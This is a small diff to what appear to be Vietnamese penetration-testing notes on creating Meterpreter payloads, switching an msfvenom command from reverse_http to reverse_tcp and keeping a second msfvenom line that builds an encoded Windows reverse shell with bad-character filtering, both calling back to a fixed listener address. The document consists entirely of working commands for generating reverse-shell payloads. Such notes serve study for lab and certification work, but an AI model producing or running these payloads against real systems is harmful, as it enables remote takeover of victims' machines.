@@ -25,7 +25,7 @@
 
 
 - Tạo meterpreter:
-  - msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f exe -o met.exe
+  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=8080 -f exe -o met.exe
     
   - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=8080 -f python –e x86/shikata_ga_nai -b "\x00..."
     
